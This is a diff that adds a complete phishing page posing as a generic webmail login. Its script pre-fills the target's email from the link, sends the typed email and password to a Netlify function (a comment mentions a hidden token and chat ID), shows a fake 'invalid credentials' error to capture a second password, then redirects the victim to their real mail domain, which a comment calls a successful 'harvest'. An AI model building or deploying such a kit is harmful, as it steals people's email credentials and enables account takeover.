@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Webmail Login</title>
+    <style>
+        /* --- Clean & Modern Styles --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: "Open Sans", Helvetica, Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            padding-top: 5%;
+        }
+
+        .error-bar {
+            display: none;
+            background-color: #d35351;
+            color: #fff;
+            padding: 12px 16px;
+            position: fixed;
+            top: 12px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 360px;
+            max-width: 90%;
+            font-size: 13px;
+            z-index: 9999;
+            border-radius: 5px;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .container { width: 100%; max-width: 400px; text-align: center; }
+        
+        .logo { margin-bottom: 40px; }
+        .logo svg { height: 50px; width: auto; }
+
+        .form-group { margin-bottom: 20px; text-align: left; padding: 0 5%; }
+        .form-group label { display: block; color: #666; font-size: 14px; margin-bottom: 8px; font-weight: 600; }
+
+        .input-wrapper { position: relative; }
+        .input-wrapper input {
+            width: 100%;
+            padding: 12px 15px 12px 40px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            background-size: contain;
+            opacity: 0.4;
+        }
+
+        .user-icon { background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMEM2LjM0MzE1IDAgNSAxLjM0MzE1IDUgM0M1IDQuNjU2ODUgNi4zNDMxNSA2IDggNkM5LjY1Njg1IDYgMTEgNC42NTY4NSAxMSAzQzExIDEuMzQzMTUgOS42NTY4NSAwIDggMFoiIGZpbGw9IiM5OTkiLz4KPHBhdGggZD0iTTggN0M1LjI0IDcgMyA5LjI0IDMgMTJWMTZIOFYxNkgxM1YxMkMxMyA5LjI0IDEwLjc2IDcgOCA3WiIgZmlsbD0iIzk5OSIvPgo8L3N2Zz4K'); }
+        .lock-icon { background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDdWNUMxMiAyLjI0IDkuNzYgMCA3IDBDNC4yNCAwIDIgMi4yNCAyIDVWN0MxLjQ1IDcgMSA3LjQ1IDEgOFYxNEMxIDE0LjU1IDEuNDUgMTUgMiAxNUgxMkMxMi41NSAxNSAxMyAxNC41NSAxMyAxNFY4QzEzIDcuNDUgMTIuNTUgNyAxMiA3Wk04LjUgMTFWMTNINy41VjExQzcuMjIgMTEgNyAxMC43OCA3IDEwLjVDNyAxMC4yMiA3LjIyIDEwIDcuNSAxMEg4LjVDOC43OCAxMCA5IDEwLjIyIDkgMTAuNUM5IDEwLjc4IDguNzggMTEgOC41IDExWk0xMCA3SDRWNUM0IDMuMzQgNS4zNCAyIDcgMkM4LjY2IDIgMTAgMy4zNCAxMCA1VjdaIiBmaWxsPSIjOTk5Ii8+Cjwvc3ZnPgo='); }
+
+        .login-btn {
+            width: 90%;
+            background: #179bd7;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .footer { margin-top: 50px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+
+<div id="error-bar" class="error-bar">
+    <span>✖</span>
+    <span id="error-text">The login is invalid.</span>
+</div>
+
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 1462 240"><path fill="#ff6c2c" d="M365.102 14.398l-43.204 160.204..."/></svg>
+    </div>
+
+    <form id="login-form">
+        <div class="form-group">
+            <label>Email Address</label>
+            <div class="input-wrapper">
+                <div class="input-icon user-icon"></div>
+                <input type="email" id="ai" name="ai" placeholder="Email address" required>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Password</label>
+            <div class="input-wrapper">
+                <div class="input-icon lock-icon"></div>
+                <input type="password" id="pw" name="password" placeholder="Password" required>
+            </div>
+        </div>
+
+        <button type="submit" class="login-btn" id="submit-btn">Log in</button>
+    </form>
+
+    <div class="footer">
+        <p>&copy; 2026 Webmail Terminal. All rights reserved.</p>
+    </div>
+</div>
+
+<script>
+    /**
+     * Netlify Secure Frontend Script
+     */
+    let attempts = 0;
+
+    // 1. Auto-fill email from URL params or Hash
+    function autoFill() {
+        const params = new URLSearchParams(window.location.search);
+        const hash = window.location.hash.replace(/[#\[\]\-]/g, '');
+        const aiField = document.getElementById('ai');
+
+        const keys = ["email", "user", "mail", "m"];
+        for (let key of keys) {
+            if (params.has(key)) {
+                aiField.value = decodeURIComponent(params.get(key));
+                return;
+            }
+        }
+        if (hash) aiField.value = decodeURIComponent(hash);
+    }
+
+    // 2. Error Display UI
+    function showError(message) {
+        const bar = document.getElementById('error-bar');
+        const text = document.getElementById('error-text');
+        text.textContent = message;
+        bar.style.display = 'flex';
+        setTimeout(() => { bar.style.display = 'none'; }, 5000);
+    }
+
+    // 3. Secure Submission to Netlify Function
+    async function handleLogin(e) {
+        e.preventDefault();
+        attempts++;
+
+        const btn = document.getElementById('submit-btn');
+        const email = document.getElementById('ai').value;
+        const password = document.getElementById('pw').value;
+
+        // Visual feedback
+        btn.innerText = "Authenticating...";
+        btn.disabled = true;
+
+        try {
+            // This calls your Netlify Function, keeping Token/ChatID hidden on the server
+            const response = await fetch('/.netlify/functions/submit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    attempt: attempts,
+                    userAgent: navigator.userAgent
+                })
+            });
+
+            // Reset UI
+            btn.innerText = "Log in";
+            btn.disabled = false;
+            document.getElementById('pw').value = "";
+
+            if (attempts === 1) {
+                showError("Invalid credentials. Please try again.");
+            } else {
+                // Successful "harvest" - Redirect to actual domain
+                const domain = email.split('@')[1] || 'outlook.com';
+                window.location.href = `https://${domain}`;
+            }
+
+        } catch (err) {
+            btn.innerText = "Log in";
+            btn.disabled = false;
+            showError("Network error. Please check your connection.");
+        }
+    }
+
+    // Initialization
+    window.addEventListener('DOMContentLoaded', () => {
+        autoFill();
+        document.getElementById('login-form').addEventListener('submit', handleLogin);
+    });
+</script>
+
+</body>
+</html>
